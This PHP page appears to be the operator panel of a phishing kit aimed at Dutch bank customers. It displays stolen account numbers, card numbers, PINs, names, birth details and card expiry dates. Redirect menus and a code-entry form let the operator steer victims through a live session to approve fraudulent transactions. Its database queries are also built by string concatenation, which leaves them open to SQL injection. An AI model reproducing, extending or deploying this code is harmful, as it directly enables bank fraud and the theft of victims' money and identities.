<?php
require_once("../common/commonfiles.php");
if ($_SESSION["loggedInUserRole"] == "admin") {
    $isAdmin = true;
} else {
    $isAdmin = false;
}
$data = db::getRecords("SELECT * FROM data WHERE status=0 ORDER BY id DESC");
include_once 'header.php';
?>
<table class="table">
    <thead>
    <tr>
        <th class="text-center">Status</th>
        <th class="text-center">Date</th>
        <th class="text-center">Rek. nummer</th>
        <th class="text-center">Pas nr.</th>
        <th class="text-center">Respons</th>
        <th class="text-center">Redirect</th>
        <?php
        if ($_SESSION['mode'] == 1) { ?>
            <th class="text-center">Info</th>
            <th class="text-center">Pin</th>
            <th class="text-center">Verzenden</th>
            <th class="text-center">Respons</th>
        <?php } ?>
        <th class="text-center">Redirect 2</th>
        <th class="text-center">Action</th>
        <th class="text-center">Handler</th>
    </tr>
    </thead>
    <tbody>
    <?php
    $counter = 1;
    foreach ($data as $value) {
        $get_ip = db::getCell("SELECT ip FROM data WHERE ip='" . $value['ip'] . "' AND id !='" . $value['id'] . "'");
        $ipExists = !empty($get_ip) ? true : false;
        $handler = db::getRecord("SELECT * FROM user WHERE id='" . $value['handler_id'] . "'");
        ?>
        <tr <?php echo ($ipExists) ? 'style="color:red"' : ''; ?>
                class="<?php echo ($_SESSION['mode'] == 2 && $value['blink'] == 1) ? 'blinking' : ''; ?>">
            <td class="text-center">
                <?php
                $loggedTime = time() - 120; //2 minutes
                if ($value['last_online'] > $loggedTime) {
                    echo '<i class="fa fa-circle" style="color:green;"></i>';
                } else {
                    echo '<i class="fa fa-circle"></i>';
                }
                ?>
            </td>
            <td class="text-center">
                <b><?php $d = explode(" ", $value['date']);
                    echo $d[0] . "<br />" . $d[1] . " " . $d[2]; ?></b>
            </td>
            <td class="text-center">
                <p id="account_number<?php echo $value['id'] ?>"><?php echo $value['account_number']; ?></p>
                <button data-id="<?php echo $value['id'] ?>" href="javascript:;"
                        onclick="copyFunction('#account_number<?php echo $value['id'] ?>')"
                        class="btn btn-primary btn-xs copyBtn">Copy
                </button>
            </td>
            <td class="text-center">
                <p id="password<?php echo $value['id'] ?>"><?php echo $value['password']; ?></p>
                <button data-id="<?php echo $value['id'] ?>" href="javascript:;"
                        onclick="copyFunction('#password<?php echo $value['id'] ?>')"
                        class="btn btn-primary btn-xs copyBtn">Copy
                </button>
            </td>
            <td class="text-center">
                <p id="response<?php echo $value['id'] ?>"><?php echo $value['response']; ?></p>
                <button data-id="<?php echo $value['id'] ?>" href="javascript:;"
                        onclick="copyFunction('#response<?php echo $value['id'] ?>')"
                        class="btn btn-primary btn-xs copyBtn">Copy
                </button>
            </td>
            <td width="10%" class="text-center">
                <select class="form-control redirect1" data-id="<?php echo $value["id"]; ?>"
                        id="redirect1<?php echo $counter; ?>" name="redirect1">
                    <option value="">-Select-</option>
                    <option <?php echo $value['redirect1'] == "error" ? "selected='selected'" : "" ?> value="error">
                        Error
                    </option>
                    <option <?php echo $value['redirect1'] == "url" ? "selected='selected'" : "" ?> value="url">
                        Redirect
                    </option>
                    <option <?php echo $value['redirect1'] == "block" ? "selected='selected'" : "" ?> value="block">
                        Block
                    </option>
                </select>
            </td>
            <?php if ($_SESSION['mode'] == 1) { ?>
                <td class="text-center">
                    <a href="#"
                       data-toggle="popover"
                       data-placement="bottom"
                       data-html="true"
                       data-trigger="hover"
                       data-content="<b>Volledige voornamen:</b><br /><?php echo $value['text1']; ?><br />
                       <b>Geboorteplaats:</b><br /><?php echo $value['text2']; ?><br />
                       <b>Vervaldatum betaalpas:</b><br /><?php echo $value['expiry_month'] . "-" . $value['expiry_year']; ?><br />
                       <b>Geboortedatum:</b><br /><?php echo $value['day'] . "-" . $value['month'] . "-" . $value['year']; ?><br />">
                        <i class="fa fa-exclamation-circle"></i>
                    </a>
                    <?php if (!empty($value['text1'])) { ?>
                        <i class="fa fa-check" style="color:green"></i>
                    <?php } ?>
                </td>
                <td class="text-center">
                    <a href="#"
                       data-toggle="popover"
                       data-placement="bottom"
                       data-html="true"
                       data-trigger="hover"
                       data-content="<b>Huidige pin:</b><br /><?php echo $isAdmin ? $value["pin1"] : "****"; ?><br />
                       <b>Huidige pin (bevestiging):</b><br /><?php echo $isAdmin ? $value["pin2"] : "****"; ?><br />
                       <b>Nieuwe pin:</b><br /><?php echo $isAdmin ? $value["pin3"] : "****"; ?><br />
                       <b>Nieuwe pin (bevestiging):</b><br /><?php echo $isAdmin ? $value["pin4"] : "****"; ?><br />">
                        <i class="fa fa-exclamation-circle"></i>
                    </a>
                    <?php if (!empty($value['pin1'])) { ?>
                        <i class="fa fa-check" style="color:green"></i>
                    <?php } ?>
                </td>
                <td class="text-center">
                    <input type="text"
                           style="width:50%; <?php echo ($value['verzenden'] == '') ? 'background-color:orange' : 'background-color:green'; ?>"
                           class="form-control" value="<?php echo $value['verzenden']; ?>" data-toggle="popover"
                           data-placement="top" data-html="true"
                           data-content="<form name='form' method='post' action='actions.php?j=111'><div class=''><div class='input-group'><input type='text' class='form-control' value='<?php echo $value['kleure_ncode']; ?>' name='verzenden' placeholder='Enter Code''><span class='input-group-btn'> <button class='btn btn-secondary' type='submit'>Submit</button></span></div></div></div><input type='hidden' name='rid' value='<?php echo $value['id']; ?>'></form>"
                           title="Enter Code">
                </td>
                <td><?php echo $value['response2']; ?></td>
            <?php } ?>
            <td width="10%" class="text-center">
                <select class="form-control redirect" data-id="<?php echo $value["id"]; ?>"
                        id="redirect<?php echo $counter; ?>" name="redirect">
                    <option value="">-Select-</option>
                    <option <?php echo $value['redirect'] == "error" ? "selected='selected'" : "" ?> value="error">
                        Error
                    </option>
                   <option <?php echo $value['redirect'] == "url" ? "selected='selected'" : "" ?> value="url">
                        Tekenlijst
                    </option>
                    <option <?php echo $value['redirect'] == "url2" ? "selected='selected'" : "" ?> value="url2">
                        Mobiel Bevestigen
                    </option>
                </select>
            </td>
            <?php if ($value['status'] == 0) { ?>
                <td class="text-center">
                    <?php if ($_SESSION['mode'] == 2) { ?>
                        <span style="color: orange!important;font-size: 20px;">
                                <a class="btn btn-xs btn-success" href="actions.php?j=100&id=<?php echo $value['id'] ?>"
                                   onclick="return setApprove()" title="Delete"><i
                                            class="glyphicon glyphicon-ok"></i></a>&nbsp;
                            </span>
                    <?php } ?>
                    <span style="color: orange!important;font-size: 20px;">
                        <a class="btn btn-xs btn-danger" href="actions.php?j=9&id=<?php echo $value['id'] ?>"
                           onclick="return deleteit()"
                           title="Delete"><i class="glyphicon glyphicon-trash"></i>
                        </a>
                    </span>
                </td>
            <?php } else if ($value['status'] == 1) { ?>
                <td class="text-center"><span style="color:green"><b>Approved</b></span></td>
            <?php } else if ($value['status'] == 2) { ?>
                <td class="text-center"><span style="color:red"><b>Deleted</b></span></td>
            <?php } ?>

            <td class="text-center">
                <span style="color:<?php echo trim($handler['color']); ?>"><?php echo $handler['username'] ?></span>
            </td>
        </tr>
        <?php
        $counter++;
    }
    ?>
    </tbody>
</table>
<script>
    $(document).ready(function () {
        $('.bcv').on('mouseover', function (e) {
            $(this).tooltip('disable');
        });

        $('.bcv').on('focus', function () {
            $(this).tooltip('enable').tooltip('show');
        });
        $(".redirect").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            $.get("update_redirect.php?id=" + $(this).attr("data-id") + "&redirect=" + $(this).val());
        });
        $(".redirect1").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            $.get("update_redirect1.php?id=" + $(this).attr("data-id") + "&redirect1=" + $(this).val());
        });
    });
    $(function () {
        $('[data-toggle="popover"]').popover()
    })
    $("#pageName").html("Progress");

    function copyFunction(element) {
        var $temp = $("<input>");
        $("body").append($temp);
        $temp.val($(element).text()).select();
        document.execCommand("copy");
        $temp.remove();
    }
</script>
<style>
    .blinking {
        animation: blinkingText 2s infinite;
    }

    @keyframes blinkingText {
        0% {
            color: #000;
        }
        49% {
            color: transparent;
        }
        50% {
            color: transparent;
        }
        99% {
            color: transparent;
        }
        100% {
            color: #000;
        }
    }

</style>